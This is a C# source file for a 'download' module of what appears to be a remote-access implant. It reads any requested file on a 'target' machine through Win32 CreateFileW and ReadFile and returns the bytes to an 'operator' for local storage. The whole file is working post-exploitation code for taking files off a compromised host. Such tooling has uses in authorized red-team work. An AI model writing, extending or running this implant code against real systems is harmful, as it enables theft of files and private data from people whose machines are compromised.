using System;
using System.Text;
using Agent.Interop;

namespace Agent.NativeModules
{
    /// <summary>
    /// Read file from target using CreateFileW/ReadFile and return bytes
    /// to the operator for local storage.
    /// </summary>
    public class FileDownloadModule : INativeModule
    {
        public string Name { get { return "download"; } }
        public string Description { get { return "Download file from target"; } }

        private const uint MAX_DOWNLOAD_SIZE = 50 * 1024 * 1024; // 50MB limit

        public byte[] Execute(byte[] arguments)
        {
            if (arguments == null || arguments.Length == 0)
                return Encoding.UTF8.GetBytes("[!] Usage: download <filepath>");

            string path = Encoding.UTF8.GetString(arguments).Trim('\0').Trim();

            IntPtr hFile = Kernel32.CreateFileW(
                path,
                Kernel32.GENERIC_READ,
                Kernel32.FILE_SHARE_READ,
                IntPtr.Zero,
                Kernel32.OPEN_EXISTING,
                0,
                IntPtr.Zero);

            if (hFile == Kernel32.INVALID_HANDLE_VALUE)
            {
                return Encoding.UTF8.GetBytes(string.Format(
                    "[!] Cannot open '{0}': error {1}",
                    path, System.Runtime.InteropServices.Marshal.GetLastWin32Error()));
            }

            try
            {
                uint fileSize = Kernel32.GetFileSize(hFile, IntPtr.Zero);
                if (fileSize == 0xFFFFFFFF)
                    return Encoding.UTF8.GetBytes("[!] Cannot determine file size");

                if (fileSize > MAX_DOWNLOAD_SIZE)
                    return Encoding.UTF8.GetBytes(string.Format(
                        "[!] File too large ({0} bytes). Max: {1} bytes. " +
                        "Use chunked download for large files.",
                        fileSize, MAX_DOWNLOAD_SIZE));

                if (fileSize == 0)
                    return Encoding.UTF8.GetBytes("[*] File is empty (0 bytes)");

                byte[] buffer = new byte[fileSize];
                uint bytesRead;

                if (!Kernel32.ReadFile(hFile, buffer, fileSize, out bytesRead, IntPtr.Zero))
                {
                    return Encoding.UTF8.GetBytes(string.Format(
                        "[!] ReadFile failed: error {0}",
                        System.Runtime.InteropServices.Marshal.GetLastWin32Error()));
                }

                // Return file bytes — the operator client will save to disk
                byte[] result = new byte[bytesRead];
                Array.Copy(buffer, result, bytesRead);
                return result;
            }
            finally
            {
                Kernel32.CloseHandle(hFile);
            }
        }
    }
}
